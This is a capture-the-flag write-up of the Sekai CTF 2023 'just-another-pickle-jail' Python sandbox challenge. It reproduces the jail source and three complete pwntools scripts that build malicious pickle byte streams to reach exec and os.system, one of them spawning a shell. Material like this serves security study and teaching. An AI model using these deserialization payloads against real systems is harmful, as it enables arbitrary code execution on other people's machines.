# Sekai CTF 2023 just-another-pickle-jail

> Based on [maple3142's writeup](https://blog.maple3142.net/2023/08/27/sekai-ctf-2023-writeups/) and the [official solution](https://github.com/project-sekai-ctf/sekaictf-2023/blob/main/misc/just-another-pickle-jail/solution/gen-pkl.py). May contain errors. This challenge uses Python 3.11.

`chall.py`:

```python
#!/usr/bin/python3
# Heavily based on AZ's you shall not call (ictf 2023), because that was a great chall 

import __main__

# Security measure -- don't let people get io module
from io import BytesIO

from my_pickle import _Unpickler as Unpickler

class mgk:
    class nested:
        pass


mgk.nested.__import__ = __import__
mgk.nested.banned = list(Unpickler.__dict__.keys())
E = type('', (), {'__eq__': lambda s,o:o})() # from hsctf 2023
x = vars(object) == E
x['mgk'] = mgk
del x
del mgk
del E

def __setattr__(self, a, b):  # wow look its the custom setattr no one asked for!!!!
    if a not in object.mgk.nested.banned:
        __main__ = object.mgk.nested.__import__('__main__')
        if not ((a == 'setattr' or '__' in a) and self == __main__): # overwriting my protections? How dare you!
            try:
                object.__setattr__(self, a, b)
            except:
                type.__setattr__(self, a, b)

Unpickler.__setattr__ = __setattr__
__import__('builtins').__dict__['setattr'] = __setattr__
del __setattr__



def __import__(x, *_): # ok who needs more than 1 arg like wtf i did not know there was 5 args lmfao
    if x in ['builtins', '__main__']:
        return object.mgk.nested.__import__(x) # this is fair trust
__import__('builtins').__dict__['__import__'] = __import__
del __main__.__import__


E = type('', (), {'__eq__': lambda s,o:o})()
x = vars(type(__main__)) == E
def mgetattr(self, a, d=None):
    for x in ['exe', 'os', 'break', 'eva', 'help', 'sys', 'load', 'open', 'dis', 'lic', 'cre']:
        if x in a:
            return None
    else:
        try:
            return object.__getattribute__(self, a)
        except:
            try:
                return type.__getattribute__(self, a)
            except:
                return d

x['__getattribute__'] = mgetattr # not paranoid
__import__('builtins').__dict__['getattr'] = mgetattr # :>

del E
del x
del __main__.mgetattr

# Security measure -- remove dangerous magic
for k in list(globals()):
    if '_' in k and k not in ['__main__', '__builtins__']:
        del globals()[k]
del k


# Security measure -- remove dangerous magic
__builtins__ = vars(__builtins__)
for x in ['__name__', '__doc__', '__package__', '__loader__', '__spec__', '__build_class__', '__debug__', '__import__']:
    del __builtins__[x]

try:
    up = Unpickler(BytesIO(bytes.fromhex(input(">>> "))))
    up.load()
except:
    pass
```

The custom [`my_pickle.py`](https://raw.githubusercontent.com/project-sekai-ctf/sekaictf-2023/refs/heads/main/misc/just-another-pickle-jail/challenge/src/my_pickle.py) is a copy of `pickle._Unpickler` with many dangerous opcodes disabled (`load_reduce`, `load_newobj`, `load_newobj_ex`, `load_inst`, `load_obj`, `_instantiate`, `get_extension`, `load_additems` all call `die()`), and restricted `find_class`.

Requirements:

1. `find_class` only looks up names in `__main__` and blocks names containing `exe`, `os`, `break`, `eva`, `help`, `sys`, `load`, `open`, `dis`, `lic`, `cre`
2. `__getattribute__` on module objects is replaced with `mgetattr` that blocks the same substrings
3. `BUILD`, `SETITEM`, and memo writes all block keys containing `__` or equal to `setattr`
4. `REDUCE`, `NEWOBJ`, `NEWOBJ_EX`, `INST`, `OBJ`, `ADDITEMS`, and `EXT` opcodes are all blocked
5. `__builtins__` has `__import__`, `__build_class__`, `__name__`, etc. deleted
6. `__setattr__` on Unpickler blocks writes to existing method names

All three solutions below exploit a common weakness: `BUILD` modifies `inst.__dict__` directly, bypassing `__setattr__`. `BINPERSID` calls `self.persistent_load(pid)` which is unchecked.

## Approach A: `BINPERSID` function call

**How it works:**

`BINPERSID` pops a value `pid` from the stack and calls `self.persistent_load(pid)`:

```python
def load_binpersid(self):
    pid = self.stack.pop()
    self.append(self.persistent_load(pid))
```

By setting `up.persistent_load` to arbitrary functions via `BUILD` (which writes directly to `up.__dict__`, bypassing `__setattr__`), we can call any single-argument function.

1. **Copy builtins into `__main__`**: `BUILD __main__` with `__builtins__` state copies all builtin entries into `__main__.__dict__`, making them accessible via `find_class`.

2. **Expose dict methods**: Set `up.persistent_load = vars`, then `BINPERSID` with `dict` calls `vars(dict)`, returning `dict`'s `__dict__` mappingproxy. `BUILD __main__` with this mappingproxy adds methods like `values` to `__main__`.

3. **Iterate builtins values**: Set `up.persistent_load = dict.values`, `BINPERSID` with `__builtins__` calls `dict.values(__builtins__)` → `dict_values`. Set `up.persistent_load = iter`, `BINPERSID` with the `dict_values` → iterator.

4. **Get `exec`**: Set `up.persistent_load = next`. After the challenge setup, `exec` is at index 13 in `builtins.__dict__.values()`. Call `next(iterator)` 13 times to skip, then once more to get `exec`.

5. **Execute code**: Set `up.persistent_load = exec`, `BINPERSID` with a code string → `exec(code)`.

```python
#!/usr/bin/env python3
import pickle, struct
from pwn import *

context.log_level = 'error'
HOST = sys.argv[1] if len(sys.argv) > 1 else 'localhost'
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1337
FLAG_CMD = sys.argv[3] if len(sys.argv) > 3 else './flag'

def short_binunicode(s):
    data = s.encode('utf-8'); assert len(data) < 256
    return pickle.SHORT_BINUNICODE + bytes([len(data)]) + data

p = pickle.PROTO + b'\x02'

# Phase 0: Copy __builtins__ entries into __main__
p += pickle.GLOBAL + b'__main__\n__main__\n'
p += pickle.MEMOIZE
p += pickle.GLOBAL + b'__main__\n__builtins__\n'
p += pickle.MEMOIZE
p += pickle.BUILD

# Phase 1: vars(dict) mappingproxy -> __main__
p += pickle.GLOBAL + b'__main__\ndict\n'; p += pickle.MEMOIZE
p += pickle.GLOBAL + b'__main__\nvars\n'; p += pickle.MEMOIZE
p += pickle.GLOBAL + b'__main__\nup\n';   p += pickle.MEMOIZE

# up.persistent_load = vars
p += pickle.BINGET + bytes([4]) + pickle.EMPTY_DICT + pickle.MARK
p += short_binunicode('persistent_load') + pickle.BINGET + bytes([3])
p += pickle.SETITEMS + pickle.BUILD

# BINPERSID calls vars(dict) -> mappingproxy
p += pickle.BINGET + bytes([2]) + pickle.BINPERSID + pickle.MEMOIZE
# BUILD __main__ with mappingproxy (adds dict.values etc.)
p += pickle.BINGET + bytes([0]) + pickle.BINGET + bytes([5]) + pickle.BUILD

# Phase 2: dict.values(__builtins__) -> dict_values
p += pickle.GLOBAL + b'__main__\nvalues\n'; p += pickle.MEMOIZE
p += pickle.BINGET + bytes([4]) + pickle.EMPTY_DICT + pickle.MARK
p += short_binunicode('persistent_load') + pickle.BINGET + bytes([6])
p += pickle.SETITEMS + pickle.BUILD
p += pickle.BINGET + bytes([1]) + pickle.BINPERSID + pickle.MEMOIZE

# Phase 3: iter(dict_values) -> iterator
p += pickle.GLOBAL + b'__main__\niter\n'; p += pickle.MEMOIZE
p += pickle.BINGET + bytes([4]) + pickle.EMPTY_DICT + pickle.MARK
p += short_binunicode('persistent_load') + pickle.BINGET + bytes([8])
p += pickle.SETITEMS + pickle.BUILD
p += pickle.BINGET + bytes([7]) + pickle.BINPERSID + pickle.MEMOIZE

# Phase 4: next(iterator) 13 times -> exec (at index 13 after setup)
p += pickle.GLOBAL + b'__main__\nnext\n'; p += pickle.MEMOIZE
p += pickle.BINGET + bytes([4]) + pickle.EMPTY_DICT + pickle.MARK
p += short_binunicode('persistent_load') + pickle.BINGET + bytes([10])
p += pickle.SETITEMS + pickle.BUILD
for _ in range(13):
    p += pickle.BINGET + bytes([9]) + pickle.BINPERSID + pickle.POP
p += pickle.BINGET + bytes([9]) + pickle.BINPERSID + pickle.MEMOIZE

# Phase 5: exec(code)
p += pickle.BINGET + bytes([4]) + pickle.EMPTY_DICT + pickle.MARK
p += short_binunicode('append') + pickle.BINGET + bytes([11])
p += pickle.SETITEMS + pickle.BUILD
code = f'o=object.mgk.nested.__import__("os");o.system("{FLAG_CMD}")'
p += short_binunicode(code) + pickle.STOP

r = remote(HOST, PORT); r.recvuntil(b'>>> ')
r.sendline(p.hex().encode()); print(r.recvall(timeout=3).decode(errors='replace'))
```

## Approach B: `NEXT_BUFFER` trampoline (maple3142)

**How it works:**

`load_next_buffer` calls `next(self._buffers)`. The name `next` is resolved from `my_pickle`'s globals, which uses the builtins module. Since `__main__.__builtins__` IS `builtins.__dict__` (after `chall.py` line 77: `__builtins__ = vars(__builtins__)`), modifying `__main__.__builtins__['next']` actually modifies the real builtins, affecting name resolution in all modules.

By setting `__builtins__['next'] = fn` and `up._buffers = arg`, each `NEXT_BUFFER` opcode calls `fn(arg)`:

```python
def load_next_buffer(self):
    buf = next(self._buffers)  # next is now fn, _buffers is arg
    self.append(buf)
```

1. **Copy builtins into `__main__`** via BUILD.
2. **`NEXT_BUFFER(vars, dict)`** → `vars(dict)` → mappingproxy. BUILD into `__main__`.
3. **`NEXT_BUFFER(vars, list)`** → `vars(list)` → mappingproxy. BUILD into `__main__`.
4. **`NEXT_BUFFER(dict.values, __builtins__)`** → `dict.values(__builtins__)` → `dict_values`.
5. **`NEXT_BUFFER(list, dict_values)`** → convert to list.
6. **`NEXT_BUFFER(iter, list)`** → iterator.
7. **`NEXT_BUFFER(next, iterator)`** 14 times → get `exec`.
8. **`NEXT_BUFFER(exec, code_string)`** → `exec(code)`.

```python
#!/usr/bin/env python3
import pickle, struct
from pwn import *

context.log_level = 'error'
HOST = sys.argv[1] if len(sys.argv) > 1 else 'localhost'
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1337
FLAG_CMD = sys.argv[3] if len(sys.argv) > 3 else './flag'

def short_binunicode(s):
    data = s.encode('utf-8'); assert len(data) < 256
    return pickle.SHORT_BINUNICODE + bytes([len(data)]) + data

def stack_global(m, n):
    return short_binunicode(m) + short_binunicode(n) + pickle.STACK_GLOBAL

def next_buffer_trick(fn, arg):
    b = pickle.GLOBAL + b'__main__\n__builtins__\n'
    b += short_binunicode('next') + fn + pickle.SETITEM
    b += pickle.GLOBAL + b'__main__\nup\n'
    b += pickle.MARK + pickle.NONE + pickle.MARK
    b += short_binunicode('_buffers') + arg
    b += pickle.DICT + pickle.TUPLE + pickle.BUILD + pickle.NEXT_BUFFER
    return b

p = pickle.PROTO + b'\x04'
# Copy builtins into __main__
p += stack_global('__main__', '__main__')
p += stack_global('__main__', '__builtins__'); p += pickle.BUILD + pickle.POP

# Add dict methods to __main__
p += next_buffer_trick(stack_global('__main__', 'vars'),
                       stack_global('__main__', 'dict'))
p += pickle.MEMOIZE
p += stack_global('__main__', '__main__') + pickle.BINGET + bytes([0])
p += pickle.BUILD + pickle.POP

# Add list methods to __main__
p += next_buffer_trick(stack_global('__main__', 'vars'),
                       stack_global('__main__', 'list'))
p += pickle.MEMOIZE
p += stack_global('__main__', '__main__') + pickle.BINGET + bytes([1])
p += pickle.BUILD + pickle.POP

# dict.values(__builtins__) -> dict_values
p += next_buffer_trick(stack_global('__main__', 'values'),
                       stack_global('__main__', '__builtins__'))
p += pickle.MEMOIZE

# list(dict_values) -> list; iter(list) -> iterator
p += next_buffer_trick(stack_global('__main__', 'list'),
                       pickle.BINGET + bytes([2]))
p += pickle.MEMOIZE
p += next_buffer_trick(stack_global('__main__', 'iter'),
                       pickle.BINGET + bytes([3]))
p += pickle.MEMOIZE

# next(iterator) 14 times -> exec
for _ in range(14):
    p += next_buffer_trick(stack_global('__main__', 'next'),
                           pickle.BINGET + bytes([4]))
    p += pickle.POP if _ < 13 else pickle.MEMOIZE

# exec(code)
code = f'o=object.mgk.nested.__import__("os");o.system("{FLAG_CMD}")'
p += next_buffer_trick(pickle.BINGET + bytes([5]), short_binunicode(code))
p += pickle.STOP

r = remote(HOST, PORT); r.recvuntil(b'>>> ')
r.sendline(p.hex().encode()); print(r.recvall(timeout=3).decode(errors='replace'))
```

## Approach C: `find_class` replacement via `__getattribute__` (official)

**How it works:**

The official exploit chains `BUILD` and `SETITEM` to set up `__main__.__dict__` entries, replace `Unpickler.__getattribute__` with `mgetattr`, and create a second `Unpickler` instance via the `NEXT_BUFFER` trick. A mini-pickle payload (`pkl2`) is fed through `GET*3` (without explicit arguments, relying on frame byte positions) to construct a dict and call `STACK_GLOBAL`. The payload runs `os.system('sh')` to open a shell; the command to execute must be sent separately through the connection.

```python
#!/usr/bin/env python3
from pickle import *
import struct
from pwn import *

context.log_level = 'error'

HOST = sys.argv[1] if len(sys.argv) > 1 else 'localhost'
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1337
FLAG_CMD = sys.argv[3] if len(sys.argv) > 3 else './flag'

pkl2 = b'0\n1\n2\n3\n4\n7\n5\n6\n7\n8\n9\n10\n13\n11\n12\n13\n14\n15\n'
pkl = PROTO + b"\x04"
pkl += GLOBAL + b'__main__\n__main__\n'
pkl += GLOBAL + b'__main__\n__builtins__\n'
pkl += BUILD
pkl += POP
pkl += GLOBAL + b'__main__\n__dict__\n'
pkl += MARK
pkl += STRING + b'"find_class"\n'
pkl += GLOBAL + b'__main__\ngetattr\n'
pkl += STRING + b'"persistent_load"\n'
pkl += GLOBAL + b'__main__\nprint\n'
pkl += STRING + b'"str"\n'
pkl += TRUE
pkl += SETITEMS
pkl += GLOBAL + b'__main__\nUnpickler\n'
pkl += GLOBAL + b'__main__\n__builtins__\n'
pkl += MARK
pkl += STRING + b'"str"\n'
pkl += TRUE
pkl += STRING + b'"next"\n'
pkl += GLOBAL + b'__main__\nBytesIO\n'
pkl += SETITEMS
pkl += POP*2
pkl += GLOBAL + b'__main__\nUnpickler\n'
pkl += MARK
pkl += NONE
pkl += MARK
pkl += STRING + b'"__getattribute__"\n'
pkl += GLOBAL + b'__main__\n__getattribute__\n'
pkl += DICT
pkl += TUPLE
pkl += PUT + b'0\n'

pkl += MARK
pkl += STRING + b'"hi"\n'
pkl += LIST
pkl += PUT + b'1\n'

pkl += GLOBAL + b'__main__\nup\n'
pkl += MARK
pkl += NONE
pkl += MARK
pkl += STRING + b'"_buffers"\n'
pkl += BINBYTES + struct.pack("<I", len(pkl2)) + pkl2
pkl += DICT
pkl += TUPLE
pkl += BUILD
pkl += NEXT_BUFFER
pkl += MEMOIZE

pkl += GLOBAL + b'__main__\n__builtins__\n'
pkl += STRING + b'"next"\n'
pkl += GLOBAL + b'__main__\nUnpickler\n'
pkl += SETITEM

pkl += GLOBAL + b'__main__\nup\n'
pkl += MARK
pkl += NONE
pkl += MARK
pkl += STRING + b'"_buffers"\n'
pkl += GET + b'2\n'
pkl += DICT
pkl += TUPLE
pkl += BUILD

pkl += MARK
pkl += NONE
pkl += MARK
pkl += STRING + b'"__getattribute__"\n'
pkl += GLOBAL + b'__main__\n__getattribute__\n'
pkl += DICT
pkl += TUPLE
pkl += MEMOIZE

pkl += MARK
pkl += INT + b'0\n'
pkl += GLOBAL + b'__main__\n__builtins__\n'
pkl += INT + b'1\n'
pkl += STRING + b'"type"\n'
pkl += INT + b'2\n'
pkl += GLOBAL + b'__main__\nbool\n'
pkl += INT + b'3\n'
pkl += GLOBAL + b'__main__\n__dict__\n'
pkl += INT + b'4\n'
pkl += STRING + b'"__getitem__"\n'
pkl += INT + b'5\n'
pkl += GLOBAL + b'__main__\n__builtins__\n'
pkl += INT + b'6\n'
pkl += STRING + b'"next"\n'
pkl += INT + b'8\n'
pkl += GLOBAL + b'__main__\n__dict__\n'
pkl += INT + b'9\n'
pkl += STRING + b'"_buffers"\n'
pkl += INT + b'10\n'
pkl += STRING + b'"exec"\n'
pkl += INT + b'11\n'
pkl += GLOBAL + b'__main__\n__builtins__\n'
pkl += INT + b'12\n'
pkl += STRING + b'"type"\n'
pkl += INT + b'14\n'
pkl += STRING + b'"GGS"\n'
pkl += INT + b'15\n'
pkl += STRING + b'"os=object.mgk.nested.__import__(\'os\'); os.system(\'sh\')"\n'
pkl += DICT
pkl += MEMOIZE
pkl += GLOBAL + b'__main__\nUnpickler\n'
pkl += MARK
pkl += NONE
pkl += MARK
pkl += STRING + b'"__setattr__"\n'
pkl += GLOBAL + b'__main__\n__setattr__\n'
pkl += DICT
pkl += TUPLE
pkl += BUILD

pkl += NEXT_BUFFER
pkl += MEMOIZE

pkl += GLOBAL + b'__main__\n__dict__\n'
pkl += STRING + b'"readline"\n'
pkl += GLOBAL + b'__main__\n_file_readline\n'
pkl += SETITEM
pkl += GLOBAL + b'__main__\n__dict__\n'
pkl += STRING + b'"read"\n'
pkl += GLOBAL + b'__main__\n_file_read\n'
pkl += SETITEM

pkl += GLOBAL + b'__main__\n__dict__\n'
pkl += STRING + b'"metastack"\n'
pkl += EMPTY_LIST
pkl += SETITEM
pkl += GLOBAL + b'__main__\n__dict__\n'
pkl += STRING + b'"stack"\n'
pkl += EMPTY_LIST
pkl += SETITEM
pkl += GLOBAL + b'__main__\n__dict__\n'
pkl += STRING + b'"memo"\n'
pkl += GET + b'4\n'
pkl += SETITEM

pkl += GLOBAL + b'__main__\nUnpickler\n'
pkl += GET + b'3\n'
pkl += BUILD
pkl += MARK
pkl += GET*3
pkl += SETITEM
pkl += GET*2
pkl += STACK_GLOBAL
pkl += PUT
pkl += GET*3
pkl += SETITEM
pkl += GET*3
pkl += SETITEM
pkl += NEXT_BUFFER
pkl += PUT
pkl += GET
pkl += GET
pkl += GET
pkl += SETITEM
pkl += GET
pkl += GET
pkl += STACK_GLOBAL
pkl += STOP

r = remote(HOST, PORT)
r.recvuntil(b'>>> ')
r.sendline(pkl.hex().encode())
sleep(2)
r.sendline(FLAG_CMD.encode())
print(r.recvall(timeout=3).decode(errors='replace'))
```
